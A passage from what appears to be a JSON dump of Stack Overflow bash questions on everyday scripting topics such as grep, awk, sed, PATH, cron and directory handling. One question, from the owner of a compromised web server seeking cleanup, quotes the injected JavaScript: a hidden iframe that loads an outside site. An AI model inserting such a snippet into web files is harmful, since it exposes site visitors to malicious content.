use?</p>\n"},{"tags":["linux","bash","shell","unix","bourne-shell"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":13033910,"title":"Why does cd in backticks never work","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/255414/why-doesnt-cd-work-in-a-bash-shell-script\">Why doesn’t “cd” work in a bash shell script?</a>  </p>\n</blockquote>\n\n\n\n<p>Why does cd command in backticks or $(..) never change to the new directory. Any idea how to do it in a single command, that is capture any error and change directory.</p>\n\n<pre><code>[root@linux ~]# pwd\n/root\n[root@linux ~]# cmdMsg=`cd /tmp 2&gt;&amp;1`\n[root@linux ~]# pwd\n/root\n</code></pre>\n"},{"tags":["linux","bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":13031156,"title":"Bash script: how to add a section to a config file?","body":"<p>I know how to find and replace a section in a config file like this:</p>\n\n<pre><code>sudo sed -i \"s/upload_max_filesize = 2M/upload_max_filesize = 3M/\" /etc/php5/cgi/php.ini\n</code></pre>\n\n<p>But how do I add a whole new section to the end of the config file within the bash script?</p>\n\n<pre><code>server {\n    listen      xx.xx.xx.xx:80;                # your server's public IP address\n    server_name  myapp.com;                   # your domain name\n    root         /usr/share/nginx/www/myapp/;  # absolute path to your WordPress installation    \n}\n</code></pre>\n\n<p>I tried this within the terminal <code>echo \"server { ... }\" &gt;&gt; nginx.conf</code> but I get a </p>\n\n<pre><code>-bash: nginx.conf: Permission denied\n</code></pre>\n\n<p>Not sure if this would be ok within the bash script or I would get a permission denied again...</p>\n\n<p>Many Thanks,</p>\n"},{"tags":["bash","shell","sh"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":52,"score":0,"question_id":13014490,"title":"Creating a shell script which can spawn multiple concurrent processes which call a specified web service","body":"<p>I am trying to create a load testing shell script essentially what I am looking to do is have the script spawn some N number of concurrent processes and have each of those processes call a specified URL and perform a few basic actions. I am having a hard time figuring this out - any help would be awesome!! </p>\n"},{"tags":["bash","script","find"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":27,"score":2,"question_id":13032059,"title":"Bash script to automate multiple subtitle into video mp4 container files","body":"<p>First off - I am no programmer or scripter - just what I've been playing around with for a few days.</p>\n\n<p>I've got a folder containing mp4 video files and srt subtitle files. I've managed manually to re-encode using mencoder and handbrake to hardcode the subtitles into the video files.</p>\n\n<pre><code>mencoder -oac pcm -ovc raw -sub NAMEOFVIDEO.sub -utf8 -o NAMEOFVIDEO_SRT NAMEOFVIDEO.mp4\n</code></pre>\n\n<p>This works well and is what i'm looking for. So what I have is this /working directory with multiple .srt and .mp4 ( there maybe 2 or 3 new video and srt files each day )</p>\n\n<p>I can manage if there is only 1 .srt and 1 .mp4 file BUT I'm trying to figure out how I can create a Bash script that can run the mencoder command if I have 2 or 3 different srt and mp4 files as the mencoder line has to run with the correct corresponding srt file and mp4 file combination.</p>\n\n<p>All I can come up with is something like <code>mp4_file= find \\working -type f -name \"*.mp4\" | head -1</code> which finds the first result .mp4</p>\n\n<p><code>srt_file = find \\working -type f -name \"*.srt\" | head -1</code>which finds the first result .srt ( Luckily it's the same basename file )</p>\n\n<p>then run the variables through the mencoder command, <code>mencoder -oac pcm -ovc raw -sub $srt_file -utf8 -o $mp4_file-SRT $mp4_file</code> but as I expressed if there are more than 1 combinations of files ( a loop maybe ) then I have to stick the output through <code>HandBrakeCLI --preset \"High Profile\" -i $mp4_file-SRT -o $mp4_file</code></p>\n\n<p>It's horrible and I'm missing some easier way to do this?</p>\n"},{"tags":["bash","unix","path","terminal","ubuntu-11.10"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":13031982,"title":"Adding to path so that file is available everywhere - bash","body":"<p>I am trying to add several directories to my path so that the files in that directory and it's subdirectories are available for me from the command prompt across sessions.</p>\n\n<pre><code>export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/home/username/OpenFOAM/OpenFOAM-2.1.0/etc/bashrc:/usr/share/texmf-texlive/tex/latex:/etc/crontab:/home/username/Research/Dissertation/wigner/ic/L=lambda:/home/username/Research/Dissertation/wigner/ic/L=2lambda:/home/username/Research/Dissertation/wigner/ic/L=3lambda:/home/username/Research/Dissertation/wigner/ic\n</code></pre>\n\n<p>Appending the follwing</p>\n\n<pre><code> /home/username/Research/Dissertation/wigner/ic/L=lambda:/home/username/Research/Dissertation/wigner/ic/L=2lambda:/home/username/Research/Dissertation/wigner/ic/L=3lambda:/home/username/Research/Dissertation/wigner/ic\n</code></pre>\n\n<p>to the <code>export PATH</code> line of my <code>.bashrc</code> and sourcing it didn't help. What am I doing wrong? When I try to access files from say <code>/home/username/Research/Dissertation/wigner/ic</code>, I can't.</p>\n\n<p>I've read a few posts here but they didn't really help at all. Am I missing colons, semicolons, dollar symbols? </p>\n"},{"tags":["linux","bash","serial-port","cygwin"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":91,"score":0,"question_id":12990702,"title":"Linux serial port listener and interpreter?","body":"<p>I'm using a serial device for a project, and what I'm trying to accomplish PC side, is listening for a command sent by the serial device, interpreting the query, running some code depending on the query, and transmitting back the result.</p>\n\n<p>To be honest I tried out using PHP as the listener, and it works, unfortunately the infinite loop required to make the script act as a receiver, loads the CPU to 25%. So it's not really the best option.</p>\n\n<p>I'm using cygwin right now, I'd like to create a bash script using linux native commands.</p>\n\n<p>I can receive data by using:</p>\n\n<pre><code>cat /dev/ttyS2\n</code></pre>\n\n<p>And send a response with:</p>\n\n<pre><code>echo \"command to send\" &gt; /dev/ttyS2\n</code></pre>\n\n<p>My question is, how do I make an automated listener to be able to receive and send data? The main issue I have, is actually how do I stop the <strong>cat /dev/ttyS2</strong> command once information was received, put it into a variable which then I could compare with a switch, or a series of if else then blocks. Afterwards send back a response and start the cycle all over again?</p>\n\n<p>Thanks</p>\n"},{"tags":["bash","awk"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":53,"score":0,"question_id":13029654,"title":"extract columns with Bash or awk","body":"<p>I have a folder with 1000 text files. I would like to extract fourth and fifth columns from each file and save it to an another folder with the same filenames. How can I do this with <code>awk</code> or <code>Bash</code>?</p>\n"},{"tags":["linux","bash","grep"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":13016961,"title":"Grep Syntax with Capitals","body":"<p>I'm trying to write a script with a file as an argument that greps the text file to find any word that starts with a capital and has 8 letters following it. I'm bad with syntax so I'll show you my code, I'm sure it's an easy fix.</p>\n\n<pre><code>grep -o '[A-Z][^ ]*' $1\n</code></pre>\n\n<p>I'm not sure how to specify that:</p>\n\n<p>a) it starts with a capital letter, and </p>\n\n<p>b)that it's a 9 letter word. </p>\n\n<p>Cheers</p>\n\n<p>EDIT:</p>\n\n<p>As an edit I'd like to add my new code:</p>\n\n<pre><code>while read p\ndo\necho $p | grep -Eo '^[A-Z][[:alpha:]]{8}'\ndone &lt; $1\n</code></pre>\n\n<p>I still can't get it to work, any help on my new code? </p>\n"},{"tags":["bash","shell","maven-2","ubuntu","autocomplete"],"answer_count":4,"favorite_count":4,"up_vote_count":8,"down_vote_count":0,"view_count":860,"score":8,"question_id":2805412,"title":"Bash completion for Maven escapes colon","body":"<p>I added bash completion for Maven following the docs:</p>\n\n<p><a href=\"http://maven.apache.org/guides/mini/guide-bash-m2-completion.html\">http://maven.apache.org/guides/mini/guide-bash-m2-completion.html</a></p>\n\n<p>Everything works well except for goals that use a colon. For instance, instead of</p>\n\n<pre><code>mvn eclipse:eclipse\n</code></pre>\n\n<p>completion escapes the colon</p>\n\n<pre><code>mvn eclipse\\:eclipse\n</code></pre>\n\n<p>Any suggestions how this can be fixed? I'm using Ubuntu 8.10 (2.6.27-17-generic) and</p>\n\n<blockquote>\n  <p>$ bash -version<br>\n  GNU bash, version 3.2.39(1)-release (i486-pc-linux-gnu)</p>\n</blockquote>\n"},{"tags":["bash","autocomplete"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13028438,"title":"extending Bash tab completion: how to handle paths / partial commands?","body":"<p>I've added tab completion for my program to bash. It works quite well, but I don't know how to handle partial completion of words.\nExample: the user types</p>\n\n<pre><code>./program /home/user/De\n</code></pre>\n\n<p>and presses TAB. This is then completed to</p>\n\n<pre><code>./program /home/user/Desktop/ \n</code></pre>\n\n<p>, but there's now a trailing whitespace after 'Desktop/', which is not what I want. Basically, I need a way of preventing bash from adding whitespace after the completed word.</p>\n\n<p>I don't want to use bash's completion for paths.</p>\n\n<p><strong>Edit:</strong> This seems to be unclear. When TAB is pressed, my tab-completion function finds out which word to complete (in this case, that's '/home/user/De'). It then generates a list of matches (in this case, the only match is '/home/user/Desktop'). Bash uses this list to do the actual completion: It changes '/home/user/De' to '/home/user/Desktop/ '. I want to prevent bash from adding that whitespace after 'Desktop/'.</p>\n"},{"tags":["bash","while-loop","condition"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13028343,"title":"BASH: while with -le doesn't work","body":"<p>If i'm using -le with while i'm getting the following error:</p>\n\n<pre><code>line 172: [: : integer expression expected\n</code></pre>\n\n<p>what i'm doing wrong here?</p>\n\n<p>my code:</p>\n\n<pre><code>while [ \"$LOOP_EPISODE\" -le \"100\" ]; do\n\n        my code\n        LOOP_EPISODE=$((LOOP_EPISODE+1))\ndone\n</code></pre>\n"},{"tags":["bash"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":13015206,"title":"verify the name and the IP address","body":"<p>I am trying to create a small shell script. At the begining of my script, I ask the name of the user and their IP address. \nI need to retrieve the name that is read, and the ip address. For example, if the name is entered in this way: \"Albert Smith\", I need to register one \"_\" between each space (\"Albert_Smith\").</p>\n\n<p>For the ip address, I need to know if the ip address is consistent with the format.\nIf the format is not good, I must report the error and prompt the user to enter a good ip address to continue the operation.</p>\n\n<p>I know that i need to use \"read\", but i don't know to realize my short script (replace and verify).\nThank in advance :)</p>\n"},{"tags":["bash","shell","sh","system-administration"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":23,"score":-1,"question_id":13028044,"title":"How to do exception handling in shell script?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/64786/error-handling-in-bash\">Error handling in BASH</a>  </p>\n</blockquote>\n\n\n\n<p>I have one deployement script and i want to do exception handling in ubuntu shell script i.e. bash scripts. Is there any solution for this ?</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":20,"score":1,"question_id":13027930,"title":"can a script change the cwd of the bash in which the script is running?","body":"<p>Here is the scenario, I open up a terminal, and the <code>bash</code>'s <code>cwd</code> is `/home/me', like this:</p>\n\n<pre><code>[/home/me $] ls\na.sh\n</code></pre>\n\n<p>Now I <code>a.sh</code> in the cwd like this:</p>\n\n<pre><code>[/home/me $] ./a.sh\n</code></pre>\n\n<p>What I want is that, I want to change the <code>bash</code>'s <code>cwd</code> by running <code>a.sh</code>, which means after <code>a.sh</code> finishes, the <code>bash</code>'s <code>cwd</code> won't be <code>/home/me</code>,</p>\n\n<pre><code>[/home/other_dir $]\n</code></pre>\n\n<p>Can I do that? If yes, how?</p>\n"},{"tags":["linux","bash","unix","scripting"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":13007672,"title":"Conditionally add or append to a file in linux script","body":"<p>I need to modify a file via a script.<br>\nI need to do the following:<br>\nIF a specific string does NOT exist then append it.  </p>\n\n<p>So I created the following script:  </p>\n\n<pre><code>#!/bin/bash  \nif grep -q \"SomeParameter A\" \"./theFile\"; then  \necho exist  \nelse  \n   echo doesNOTexist  \n   echo \"# Adding parameter\" &gt;&gt; ./theFile    \n   echo \"SomeParameter A\" &gt;&gt; ./theFile    \nfi\n</code></pre>\n\n<p>This works but I need to make some improvements.<br>\nI think it would be better if I checked if \"SomeParameter\" exists and then see if it is followed by \"A\" or \"B\". If it is \"B\" then make it \"A\".<br>\nOtherwise append the string (like I do) BUT BEFORE the start of the last block of comments.<br>\nHow could I do this?<br>\nI am not good in scripting.<br>\nThanks!</p>\n"},{"tags":["linux","bash","shell","fedora"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":4804,"score":2,"question_id":4785068,"title":"BASH expr command + not working","body":"<p>Not sure why this <code>expr</code> command is extremely picky - here's my code:</p>\n\n<pre><code>#! /bin/bash\n\nCOUNTER=0\nwhile [ $COUNTER -lt 5 ]\ndo\n    echo \"i will add this line to file mycreation\"&gt;&gt;./myfile\n    COUNTER = `expr $COUNTER + 1`\ndone\n</code></pre>\n\n<p>I tried replacing <code>COUNTER</code> with <code>$COUNTER</code> such that</p>\n\n<pre><code>$COUNTER = `expr $COUNTER + 1`  \n</code></pre>\n\n<p>I'm also using backticks. The error I get (with <code>$COUNTER</code> on the left hand side) is: </p>\n\n<pre><code>line7: 0: command not found. \n</code></pre>\n"},{"tags":["bash","shell","pipe"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":13026099,"title":"Shell programming, pipe outputfil","body":"<p>a newbie to shell programming here.</p>\n\n<p>I have this codes so far:</p>\n\n<pre><code>prog inputfile outputfile1\n\nsort -rn outputfile1 | cut -f1-2 &gt; outputfile2\n</code></pre>\n\n<p>My question is there a way to pipe the outputfile directly from the first command to the second to get outputfile2, i.e. skipping the need to create an outputfile1? prog is a custom program that takes inputfile and outpufile names as parameters.</p>\n\n<p>The closest thing I have found is substitution in shell, e.g.</p>\n\n<pre><code>sort &lt;(ls dir)\n</code></pre>\n\n<p>But it's not really helpful in this case as I want to pipe the outputfile only and not the stdout. \nThanks for your help!</p>\n"},{"tags":["bash","grep"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":13024828,"title":"IF grep finds what it is looking fore do X else Y","body":"<p>In this statement I am trying to match if a version ($var2) exist in the path /app/$var1 (application name)</p>\n\n<pre><code>if \nfind /app/$var1 -maxdepth 1 -type l -o -type d | grep $var2 #results in a nice list where i can manually get a true match.\n# if match is found then execute command.\n$realcmd \"$@\"\n    rc=$?\n    exit $rc\nelse\necho \"no match, the version you are looking for does not exist\"\nfi\n</code></pre>\n\n<p>current code:\nthis include all my code (not cleaned).\ncommand I run: \"./xmodule load firefox/3.6.12\" \nthis version does exit</p>\n\n<pre><code>    #!/bin/bash\n# hook for some commands\n\n#echo $@  #value of sting that is entered after \"xmodule\"\n\ncmd=$(basename \"$0\")\n#echo \"called as $cmd\"\n\nif [[ $cmd = \"xmodule\" ]]\nthen\n    realcmd='/app/modules/0/bin/modulecmd tcsh'\n\n    # verify parameters\nfi\n# check if $@ contains value \"/\" to determine if a specific version is requested.\ncase \"$@\" in\n*/*)\n    echo \"has slash\"\nvar1=$(echo \"$@\" | grep -Eio '\\s\\w*') # Gets the aplication name and put it into var1\necho $var1   # is not printed should be \"firefox\"\nvar2=$(echo \"$@\" | grep -o '[^/]*$')  # Gets version name and put it into var2 \necho $var2 \n# Checking if version number exist in /app/appname/\nif find /app/$var1 -noleaf -maxdepth 1 -type l -o -type d | grep $var2; then\n    $realcmd \"$@\"\n    exit $?\nelse\n    echo \"no match, the version you are looking for does not exist\"\n    # Should there be an exit here?\nfi\n    ;;\n\n*)\n    echo \"doesn't have a slash\"\n    ;;\nesac\n</code></pre>\n\n<p>output:\nmycomputer [9:55am] [user/Desktop/script] -> ./xmodule load firefox/3.6.12\n'has slash</p>\n\n<p>3.6.12\nno match, the version you are looking for does not exist</p>\n\n<p>Where there is a blank (above 3.6.1) there should be the application name. I am now realizing that this must be my problem sins the path that it uses i likely just /app.\nBut I do not think I changed anything in that part of the code.</p>\n"},{"tags":["bash","sorting","awk"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":13016073,"title":"put awk code in bash and sort the result","body":"<p>I have a awk code for combining 2 files and add the result to the end of file.txt using \">>\"</p>\n\n<p>my code </p>\n\n<pre><code>NR==FNR &amp;&amp; $2!=0 {two[$0]++;j=1; next }{for(i in two) {split(i,one,FS); if(one[3] == $NF){x=$4;sub( /[[:digit:]]/, \"A\", $4); print j++,$1,$2,$3,x,$4 | \"column -t\" \"&gt;&gt;\" \"./Desktop/file.txt\"}}}\n</code></pre>\n\n<p>i want put my awk to bash script and finaly sort my file.txt and save sorted result to file.txt again using <code>&gt;</code></p>\n\n<p>i tried this  </p>\n\n<pre><code>#!/bin/bash\ncommand=$(awk '{NR==FNR &amp;&amp; $2!=0 {two[$0]++;j=1; next }{for(i in two) {split(i,one,FS); if(one[3] == $NF){x=$4;sub( /[[:digit:]]/, \"A\", $4); print $1,$2,$3,$4 | \"column -t\" \"&gt;&gt;\" \"./Desktop/file.txt\"}}}}')\necho -e \"$command\" | column -t | sort -s -n -k4 &gt; ./Desktop/file.txt \n</code></pre>\n\n<p>but it gives me error <code>\"for reading (no such a file or directory)\"</code></p>\n\n<p>where is my mistake?</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["linux","bash","cron","upstart"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":40,"score":3,"question_id":13024864,"title":"Cannot make a cronjob get the status of a service","body":"<p>I'm using Upstart to run a couple of services when the systems reboots. Those services should always be running. I have noticed that some of then crashed eventually, so I'm trying (without success) to create a watchdog script. </p>\n\n<p>This script will check the status of the service. If the service is down, then it should start the service and send me an email about the issue. The email script is in php and is okay. </p>\n\n<p>The problem with the watchdog bash script is that I'm just able to execute the script and read the status of the service if I launch the script manually.When using a cronjob for executing the script I get an \"empty status\" output.</p>\n\n<p>I'll show you the script:</p>\n\n<pre><code>#!/bin/bash\n# Check the service\nstatus=$(status SERVICE | awk '{print $2}')\necho \"Status of the SERVICE: $status\"\n</code></pre>\n\n<p>When I execute it manually I get:</p>\n\n<pre><code>Status of the SERVICE: stop/waiting\n</code></pre>\n\n<p>And If execute it with a cronjob I get:</p>\n\n<pre><code>Status of the SERVICE:\n</code></pre>\n\n<p>As you see I'm not getting any output when executing the script with a cronjob. In short, the cronjob is running but without providing me with the status of the service.</p>\n\n<p>Hope your X-vision can see the error that I'm not able.</p>\n\n<p>BR,</p>\n\n<p>albertof</p>\n"},{"tags":["perl","bash","optimization","big-o","code-duplication"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":13022416,"title":"Optimize Duplicate Detection","body":"<h1>Background</h1>\n\n<p>This is an optimization problem. Oracle Forms XML files have elements such as:</p>\n\n<pre><code>&lt;Trigger TriggerName=\"name\" TriggerText=\"SELECT * FROM DUAL\" ... /&gt;\n</code></pre>\n\n<p>Where the <code>TriggerText</code> is arbitrary SQL code. Each SQL statement has been extracted into uniquely named files such as:</p>\n\n<pre><code>sql/module=DIAL_ACCESS+trigger=KEY-LISTVAL+filename=d_access.fmb.sql     \nsql/module=REP_PAT_SEEN+trigger=KEY-LISTVAL+filename=rep_pat_seen.fmb.sql \n</code></pre>\n\n<p>I wrote a script to generate a list of exact duplicates using a brute force approach.</p>\n\n<h1>Problem</h1>\n\n<p>There are 37,497 files to compare against each other; it takes 8 minutes to compare one file against all the others. Logically, if <code>A = B</code> and <code>A = C</code>, then there is no need to check if <code>B = C</code>. So the problem is: how do you eliminate the redundant comparisons?</p>\n\n<p>The script will complete in approximately 208 days.</p>\n\n<h1>Script Source Code</h1>\n\n<p>The comparison script is as follows:</p>\n\n<pre><code>#!/bin/bash\n\necho Loading directory ...\n\nfor i in $(find sql/ -type f -name \\*.sql); do\n        echo Comparing $i ...\n\n        for j in $(find sql/ -type f -name \\*.sql); do\n                if [ \"$i\" = \"$j\" ]; then\n                        continue;\n                fi\n\n                # Case insensitive compare, ignore spaces\n                diff -IEbwBaq $i $j &gt; /dev/null\n\n                # 0 = no difference (i.e., duplicate code)\n                if [ $? = 0 ]; then\n                        echo $i :: $j &gt;&gt; clones.txt\n                fi\n        done\ndone\n</code></pre>\n\n<h1>Question</h1>\n\n<p>How would you optimize the script so that checking for cloned code is a few orders of magnitude faster?</p>\n\n<h2>Idea #1</h2>\n\n<p>Remove the matching files into another directory so that they don't need to be examined twice.</p>\n\n<h1>System Constraints</h1>\n\n<p>Using a quad-core CPU with an SSD; trying to avoid using cloud services if possible. The system is a Windows-based machine with Cygwin installed -- algorithms or solutions in other languages are welcome.</p>\n\n<p>Thank you!</p>\n"},{"tags":["windows","bash","cygwin"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":1208,"score":4,"question_id":10385424,"title":"Good alternatives to Cygwin? - Cygwin doesn't support natively support Win32 apps","body":"<p>After having spent the time to make some bash scripts that happen to be of significant size, newer versions of Cygwin have broken them.  These scripts call into native Win32 applications that don't link with Cygwin, which is apparently not officially supported by Cygwin.</p>\n\n<p>This has come as a surprise to me, as for years I was under the impression that Cygwin could be used in a more mixed environment that combines both native non-Cygwin Win32 apps, and POSIX programs using the Cygwin compatibility layer.  But apparently only the POSIX compatibility layer is really supported, and if native Win32 non-Cygwin apps work then it is considered a happy coincidence.</p>\n\n<p>I found this out from an incompatibility I ran into with running programs compiled against the .NET Framework from within Cygwin.  This used to work fine, but was broken a few months ago.  Specifically, standard output from a .NET program that is piped to any other Win32 program's standard input will generally cause the receiving Win32 program to get a premature end-of-file signal because Cygwin recently switched to message pipes from byte pipes a few months ago - and message pipes appear to be incompatible with any receiving app using Visual C++ or .NET Framework.  This is because .NET issues a null write to the standard output, which is only passed on to the receiving app if a message pipe is used.  The receiving app successfully reads zero bytes, so thinks it is end-of-file.  The project lead doesn't appear to consider this to be a real problem, since they apparently don't really support running non-Cygwin programs from within Cygwin (surprise!).</p>\n\n<p>To quote the project lead Christopher Faylor from multiple e-mails on the mailing list:</p>\n\n<blockquote>\n  <p>What you are seeing may be because Cygwin was changed to use\n  message-type pipes a couple of revisions ago.  This is not going to\n  change.  The change was adopted to fix a problem with Cygwin programs\n  and those are obviously our #1 priority.</p>\n  \n  <p>Regardless of how many people use Visual C++ or .NET they are really\n  not our target audience.  It's nice when things work for people who\n  don't want to use UNIX tools but they are not our primary focus. \n  Fixing problems for people who want to use non-Cygwin stuff is not\n  something that I find a high priority.</p>\n  \n  <p>From pipe.cc: Note that the write side of the pipe is opened as PIPE_TYPE_MESSAGE. \n  This <em>seems</em> to more closely mimic Linux pipe behavior and is \n  definitely required for pty handling since fhandler_pty_master writes\n  to the pipe in chunks, terminated by newline when CANON mode  is\n  specified.  </p>\n  \n  <p>The above comment shows an \"and\" relationship here.  Message type\n  pipes more closely mimic Linux (UNIX) pipe behavior AND are definitely\n  required for ptys.</p>\n  \n  <blockquote>\n    <p>I agree with James that the runtimes are probably buggy BUT I also \n    agree that cygwin should be able to have a handle these scenarios.</p>\n  </blockquote>\n  \n  <p>Your complete agreement with each other is not going to have much\n  effect.  Cygwin source code is not changed by voting.</p>\n</blockquote>\n\n<p>Even if this one issue is ultimately fixed somehow - who knows - they might break something else in 3 months and not care to fix the regression.  They might consider a patch, but it would take me quite awhile to figure out something that works.  I think my time is better spent elsewhere, because it's clear that they are quite willing to break compatibility with native Win32 apps and don't want to waste more time on getting Win32 apps to work.  So I guess Cygwin shouldn't be considered a stable platform for mixed Win32/Cygwin environments - what are my alternatives?  Where should I start that would avoid a complete rewrite into something other than bash?  I don't use more than the base Cygwin installation + some basic perl scripts.</p>\n"},{"tags":["regex","bash","sed"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":61,"score":1,"question_id":13021150,"title":"sed: mix explicit and regex phrases","body":"<p>I'm trying to write a sed command to remove a specific string followed by two digits. So far I have:</p>\n\n<pre><code>sed -e 's/bizzbuzz\\([0-9][0-9]\\)//' file.txt\n</code></pre>\n\n<p>but I cant seem to get the syntax right. Any suggestions?</p>\n"},{"tags":["linux","bash","grep"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":13022349,"title":"Grep .html Syntax","body":"<p>I'm very new to bash so I apologize if this is a dumb question.</p>\n\n<p>I'm trying to write a script that takes a file and tests to see if it ends in html. Here is my code:</p>\n\n<pre><code>echo tester.html | grep -E '[^ ]*[.html]'\n</code></pre>\n\n<p>Yet it echos every input I give it, how do I fix it? </p>\n"},{"tags":["python","perl","bash","scripting","sed"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":265,"score":2,"question_id":6259521,"title":"Best script to modify file contents on server","body":"<p><strong>Problem:</strong><br />\nI have web server that was recently compromised. They targeted javascript files. They inserted the following snippet</p>\n\n<pre><code>document.write('&lt;iframe src=\"http://lcbmc.co.uk/showthread.php?t=31540750\" width=\"1\" height=\"1\" frameborder=\"0\"&gt;&lt;/iframe&gt;') \n</code></pre>\n\n<p>this was added to the top of every single .js file on the server.</p>\n\n<p><strong>Solution:</strong><br />\nWrite a script to open every javascript file on my server that checks for malicious code, removes malicious code, and finally saves the file.</p>\n\n<p><strong>Question:</strong><br />\nWhat programming language should the script be written in? Will python work? I'm running python 2.4.3 on my server. If I run a python script under root will I have to worry about accidentally changing the owner permissions of the modified files?</p>\n\n<p>Thanks</p>\n"},{"tags":["bash","awk"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":88,"score":3,"question_id":13021130,"title":"reset row number count in awk","body":"<p>I have a file like this  </p>\n\n<h2> file.txt</h2>\n\n<pre><code>0   1   a\n1   1   b\n2   1   d\n3   1   d\n4   2   g\n5   2   a\n6   3   b\n7   3   d\n8   4   d\n9   5   g\n10   5   g\n.\n.\n.\n</code></pre>\n\n<p>I want reset row number count to 0 in first column <code>$1</code> whenever value of field in second column <code>$2</code> changes, using awk or bash script.</p>\n\n<h2>result</h2>\n\n<pre><code>0   1   a\n1   1   b\n2   1   d\n3   1   d\n0   2   g\n1   2   a\n0   3   b\n1   3   d\n0   4   d\n0   5   g\n1   5   g\n.\n.\n. \n</code></pre>\n"},{"tags":["linux","bash","escaping"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":1138,"score":0,"question_id":5608112,"title":"Escape FileNames Using The Same Way Bash Do It","body":"<p>When I use the \"tab\" key in <code>bash</code> (when you have started to type the filename and you want it to complete), <code>bash</code> escapes the filename correctly, and if I use exactly that \"escaped\" filename, it works.</p>\n\n<p>For Instance:</p>\n\n<p><code>An-Beat - Mentally Insine (Original Mix).mp3</code> => After <code>bash</code> Escapes It Using \"TAB\" \n<code>An-Beat\\ -\\ Mentally\\ Insine\\ \\(Original\\ Mix\\).mp3</code></p>\n\n<p>I'm search for a function for <code>bash</code> that will escape a filename the same way \"tab\" escapes filenames.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["linux","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":44,"score":4,"question_id":13020720,"title":"creating directory from filename and move bash","body":"<p>I have a load of files </p>\n\n<pre><code>BR0200.aaa.tsv\nBR0200.bbb.tsv\nBR0200.ccc.tsv\nBR0210.aaa.tsv\nBR0210.bbb.tsv\nBR0210.ccc.tsv\nW0210.aaa.tsv\nW0210.aaa.tsv\nW0210.aaa.tsv\n</code></pre>\n\n<p>I would like to create a series of directories based on the first part of the filename up to the first '.'</p>\n\n<pre><code>BR0200\nBR210\nW0210\n</code></pre>\n\n<p>and then move the associated files to the correct directories (i.e. all BR0200.* files to BR0200 directory).</p>\n\n<p>I have had a stab at a bash script but I keep getting errors. Any advice would be gratefully received.</p>\n\n<pre><code>#!/bin/bash\n\nfor file in BR* W0*; do\ndir = \"${file%%.*}\"\nif [-e $dir];then\nmv \"$file\" \"$dir\"\nelse\nmkdir -p \"$dir\"\nmv \"$file\" \"$dir\"\nfi\ndone\n</code></pre>\n\n<p>Sorry if this is a basic question. I have tried searching the web, but with no result.</p>\n"},{"tags":["bash","shell","scripting","cut","tr"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13020615,"title":"Take input via user in order to execute a last and cut command","body":"<p>I want to prompt a user to cut from a 'last' command along with what columns to cut. I also want to use 'tr' to fix all the difference in white spaces. This is the code I have:</p>\n\n<pre><code>echo -n \"What rows and columns would you like to cut: \"\nread num_int\nread num_row\nread num_list\nlast $num_int\ncut -f $num_row\ntr -d $num_list\n</code></pre>\n\n<p>When I run it from the command line I get the prompt, so I hit enter then put in a number to cut. I then hit enter again and I get a list of info that prints to screen but doesn't break out of the executed script. Is there a better way to set this script up? Here's some sample data of what it echo's out to the screen:</p>\n\n<pre><code>slater   pts/2        78.189.121.247   Sat Sep  1 23:21 - 23:27  (00:05)    \nslater   pts/3        77.189.121.247   Sat Sep  1 23:09 - 23:21  (00:12)    \nslater   pts/2        76.189.121.247   Sat Sep  1 22:59 - 23:09  (00:10)    \nslater   pts/2        74.189.121.247   Sat Sep  1 22:51 - 22:56  (00:05)    \npint     pts/2        74.189.121.247   Sat Sep  1 22:49 - 22:51  (00:01)    \nterry    pts/2        74-119-247-134.r Sat Sep  1 19:08 - 19:09  (00:00)    \n</code></pre>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":13014504,"title":"adding a row 